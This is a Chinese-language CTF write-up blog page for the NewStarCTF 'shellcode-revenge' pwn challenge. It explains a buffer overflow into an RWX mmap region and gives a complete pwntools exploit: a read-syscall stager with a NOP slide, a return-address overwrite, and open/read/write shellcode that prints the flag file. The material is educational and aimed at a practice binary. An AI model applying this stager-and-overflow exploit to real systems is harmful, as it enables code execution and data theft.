@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="[NewStarCTF 公开赛赛道]shellcode-revenge  我们先checksec一下：  其实开启PIE就挺恶心的了，拖入IDA中：  看到prctl函数了吧，应该是开启了沙箱的，禁用了一些系统调用，看到了mmap函数了吧，这个函数把从0x233000起始处，往后0x1000字节都赋予了可读可写可执行的权限：  我们可以从最后一个read函数溢出到buf的起始地址，因为该段为可读可">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[NewStarCTF 公开赛赛道]shellcode-revenge">
+<meta property="og:url" content="http://example.com/2024/06/02/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-shellcode-revenge/index.html">
+<meta property="og:site_name" content="WangYiHao">
+<meta property="og:description" content="[NewStarCTF 公开赛赛道]shellcode-revenge  我们先checksec一下：  其实开启PIE就挺恶心的了，拖入IDA中：  看到prctl函数了吧，应该是开启了沙箱的，禁用了一些系统调用，看到了mmap函数了吧，这个函数把从0x233000起始处，往后0x1000字节都赋予了可读可写可执行的权限：  我们可以从最后一个read函数溢出到buf的起始地址，因为该段为可读可">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2024/06/02/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-shellcode-revenge/1.png">
+<meta property="og:image" content="http://example.com/2024/06/02/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-shellcode-revenge/2.png">
+<meta property="og:image" content="http://example.com/2024/06/02/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-shellcode-revenge/3.png">
+<meta property="og:image" content="http://example.com/2024/06/02/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-shellcode-revenge/6.png">
+<meta property="article:published_time" content="2024-06-02T13:17:31.000Z">
+<meta property="article:modified_time" content="2024-06-02T13:53:47.765Z">
+<meta property="article:author" content="SunRT">
+<meta property="article:tag" content="栈溢出">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2024/06/02/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-shellcode-revenge/1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>[NewStarCTF 公开赛赛道]shellcode-revenge</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/about/">Qui som</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/projects_url">Projectes</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2024/06/03/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-canary/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2024/06/01/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-ret2csu1/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Post Anterior</span>
+      <span id="i-next" class="info" style="display:none;">Post Següent</span>
+      <span id="i-top" class="info" style="display:none;">Adalt</span>
+      <span id="i-share" class="info" style="display:none;">Compartir Post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/06/02/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-shellcode-revenge/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/06/02/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-shellcode-revenge/&text=[NewStarCTF 公开赛赛道]shellcode-revenge"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/06/02/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-shellcode-revenge/&title=[NewStarCTF 公开赛赛道]shellcode-revenge"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/06/02/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-shellcode-revenge/&is_video=false&description=[NewStarCTF 公开赛赛道]shellcode-revenge"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=[NewStarCTF 公开赛赛道]shellcode-revenge&body=Check out this article: http://example.com/2024/06/02/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-shellcode-revenge/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/06/02/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-shellcode-revenge/&title=[NewStarCTF 公开赛赛道]shellcode-revenge"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/06/02/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-shellcode-revenge/&title=[NewStarCTF 公开赛赛道]shellcode-revenge"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/06/02/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-shellcode-revenge/&title=[NewStarCTF 公开赛赛道]shellcode-revenge"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/06/02/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-shellcode-revenge/&title=[NewStarCTF 公开赛赛道]shellcode-revenge"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/06/02/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-shellcode-revenge/&name=[NewStarCTF 公开赛赛道]shellcode-revenge&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/06/02/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-shellcode-revenge/&t=[NewStarCTF 公开赛赛道]shellcode-revenge"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">[NewStarCTF 公开赛赛道]shellcode-revenge</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        [NewStarCTF 公开赛赛道]shellcode-revenge
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">SunRT</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-06-02T13:17:31.000Z" itemprop="datePublished">2024-06-02</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="tag">栈溢出</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 align="center">[NewStarCTF 公开赛赛道]shellcode-revenge</h1>
+
+<p>我们先checksec一下：</p>
+<p><img src="/2024/06/02/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-shellcode-revenge/1.png" alt="1"></p>
+<p>其实开启PIE就挺恶心的了，拖入IDA中：</p>
+<p><img src="/2024/06/02/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-shellcode-revenge/2.png" alt="2"></p>
+<p>看到prctl函数了吧，应该是开启了沙箱的，禁用了一些系统调用，看到了mmap函数了吧，这个函数把从0x233000起始处，往后0x1000字节都赋予了可读可写可执行的权限：</p>
+<p><img src="/2024/06/02/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-shellcode-revenge/3.png" alt="3"></p>
+<p>我们可以从最后一个read函数溢出到buf的起始地址，因为该段为可读可写可执行，只要buf里面写上我们想要执行的命令就可以了，但是有一个问题，这里给的0x1a太小了，不足以我们写上shellcode，因为开启了沙箱，我们用orw,既然大小不足，我们就向buf写入read函数的系统调用，让它溢出调用read函数，我们再写入数据，此时的数据大小就是我们可以控制的了，payload如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28569</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process(&quot;./pwn&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line"></span><br><span class="line">mmap_address = <span class="number">0x233000</span></span><br><span class="line"></span><br><span class="line">shellcode_1 = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode_2 = shellcraft.read(<span class="number">3</span>,mmap_address + <span class="number">0x200</span>,<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">shellcode_3 = shellcraft.write(<span class="number">1</span>,mmap_address + <span class="number">0x200</span> ,<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcode_1 + shellcode_2 + shellcode_3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = asm(shellcraft.read(0,mmap_address+0x18,0x100)) + b&#x27;A&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = asm(shellcraft.read(<span class="number">0</span>,mmap_address+<span class="number">0x18</span>,<span class="number">0x100</span>)) + <span class="string">b&#x27;\x90\x90\x90\x90&#x27;</span> <span class="comment"># nop指令，不执行任何操作，方便滑到我们写的shellcode地方</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 上面的payload动态调试可知道大小</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;Well.Just a little.&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;payload_size-----------&gt;&quot;</span>,<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;shellcode_size-----------&gt;&quot;</span>,<span class="built_in">hex</span>(<span class="built_in">len</span>(shellcode)))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;Let&#x27;s see what u can do this time~&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*(<span class="number">0x30</span>+<span class="number">0x8</span>) + p64(mmap_address)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(shellcode)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>（1）上述的shellcode_1，shellcode_2，shellcode_3的含义是：打开根目录下的flag文件，从flag文件中向mmap_address + 0x200的地址向后写入0x100字节的数据，再将mmap_address + 0x200的地址向后0x100字节的内容输出到屏幕上。这样就能输出flag的内容了，这里的0x200也可以改变，但尽量更大，避免写入的数据覆盖了我们要执行的指令。</p>
+<p>（2）nop指令是为了增加容错，使其在执行完read(0,mmap_address+0x18,0x100)函数后，可以执行到我们的shellcode</p>
+<p><img src="/2024/06/02/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-shellcode-revenge/6.png" alt="6"></p>
+<p>其实我们可以看到，payload的大小是0x19，刚好是比0x1a小一个字节，其实也没有小，因为我们还发送了0xa（换行符&#x2F;n），也就是说，我们的shellcode刚好覆盖了最后一个nop指令，前面三个nop指令帮助我们滑到了shellcode这里去执行。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/about/">Qui som</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/projects_url">Projectes</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">[NewStarCTF 公开赛赛道]shellcode-revenge</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/06/02/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-shellcode-revenge/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/06/02/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-shellcode-revenge/&text=[NewStarCTF 公开赛赛道]shellcode-revenge"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/06/02/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-shellcode-revenge/&title=[NewStarCTF 公开赛赛道]shellcode-revenge"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/06/02/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-shellcode-revenge/&is_video=false&description=[NewStarCTF 公开赛赛道]shellcode-revenge"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=[NewStarCTF 公开赛赛道]shellcode-revenge&body=Check out this article: http://example.com/2024/06/02/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-shellcode-revenge/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/06/02/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-shellcode-revenge/&title=[NewStarCTF 公开赛赛道]shellcode-revenge"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/06/02/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-shellcode-revenge/&title=[NewStarCTF 公开赛赛道]shellcode-revenge"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/06/02/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-shellcode-revenge/&title=[NewStarCTF 公开赛赛道]shellcode-revenge"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/06/02/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-shellcode-revenge/&title=[NewStarCTF 公开赛赛道]shellcode-revenge"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/06/02/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-shellcode-revenge/&name=[NewStarCTF 公开赛赛道]shellcode-revenge&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/06/02/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-shellcode-revenge/&t=[NewStarCTF 公开赛赛道]shellcode-revenge"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menú</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Compartir</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Cap amunt</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    SunRT
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/about/">Qui som</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/projects_url">Projectes</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"In die Zwischenablage kopiert!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Kopiert!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
